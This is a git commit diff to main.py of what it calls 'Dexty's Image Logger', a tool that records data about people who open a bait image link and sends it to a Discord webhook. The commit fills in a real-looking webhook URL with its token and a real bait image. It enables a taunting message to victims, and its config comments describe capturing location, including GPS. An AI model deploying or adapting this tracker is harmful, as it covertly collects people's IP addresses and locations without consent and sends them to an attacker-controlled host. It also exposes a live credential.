9537d7ece2f8ab2a976b1a97645e290348e09089
Pm392929wieiejw <meredithabramscouncil@outlook.com>
2024-12-28 23:01:56 +0530

    Update main.py

--- main.py
+++ main.py
@@ -12,8 +12,8 @@ __author__ = "Dexty"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1311264095647039538/omt9h72ULPEeeLtXUXR7ho9aOXq8VweKVNAj8yjNOvnkOrUVPPT6eiKY-9FjinMIBnrn",
+    "image": "https://cdn.discordapp.com/attachments/1311264007516327960/1322617330408095786/remix-9fb3c3c2-da17-457d-8277-306b114a05f5.jpg?ex=677186e0&is=67703560&hm=10ec46b41e1b2b18f9648dcf224f1a00a6b8f8bf3274094a3796d8849ddc9ee3&", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
@@ -27,8 +27,8 @@ config = {
     "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
 
     "message": { # Show a custom message when the user opens the image
-        "doMessage": False, # Enable the custom message?
-        "message": "This browser has been pwned by Dexty's Image Logger. https://github.com/xdexty0/Discord-Image-Logger", # Message to show
+        "doMessage": True, # Enable the custom message?
+        "message": "Womp womp 😹", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
 
@@ -63,7 +63,7 @@ config = {
     # 4) Image 
 }
 
-blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
+blacklistedIPs = ("83388282") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                            # This feature is undocumented mainly due to it being for detecting bots better.
 
 def botCheck(ip, useragent):
